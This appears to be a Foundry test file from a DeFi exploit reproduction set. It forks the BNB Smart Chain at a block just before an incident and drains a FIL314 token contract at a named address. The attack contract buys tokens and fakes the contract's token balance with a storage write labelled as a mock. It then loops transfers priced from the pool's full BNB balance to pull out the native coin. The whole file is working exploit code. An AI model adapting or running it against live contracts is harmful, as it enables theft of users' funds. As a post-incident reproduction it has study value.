// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "./IERC314.sol";

IERC314 constant Fil314 = IERC314(
    payable(0xE8A290c6Fc6Fa6C0b79C9cfaE1878d195aeb59aF)
);

contract File314Hack is Test {
    using stdStorage for StdStorage;

    address admin;

    constructor() payable {
        admin = msg.sender;
    }

    function getBalanceAccToBurnHour(
        uint256 _burnHour
    ) public pure returns (uint256) {
        /*  
        uint256 burnHour = (_balances[address(this)] * 2500) / 1000000;
        _balances[address(this)] = _balances[address(this)] - burnHour;
        */
        return (_burnHour * 1000000) / 2500 - _burnHour;
    }

    function fuckyou() public payable {
        // buy FIL314 token
        (bool ok, ) = address(Fil314).call{value: 0.05 ether}("");
        require(ok, "send BNB failed");

        // deflate the token
        // ====> mock
        uint256 Fil314Bal = getBalanceAccToBurnHour(85292482);
        stdstore
            .target(address(Fil314))
            .sig("balanceOf(address)")
            .with_key(address(Fil314))
            .checked_write(Fil314Bal);
        // ====> mock

        for (uint256 i = 0; i < 10; i++) {
            uint256 amountOut = Fil314.getAmountOut(
                address(Fil314).balance,
                true
            );
            Fil314.transfer(address(Fil314), amountOut);
        }
    }

    receive() external payable {}
}

contract File314Test is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 37_795_992 - 1);
        deal(address(this), 0.05 ether);
    }

    function testExploit() public {
        File314Hack hacker = new File314Hack();
        hacker.fuckyou{value: 0.05 ether}();

        emit log_named_decimal_uint("Balance ", address(hacker).balance, 18);
    }
}
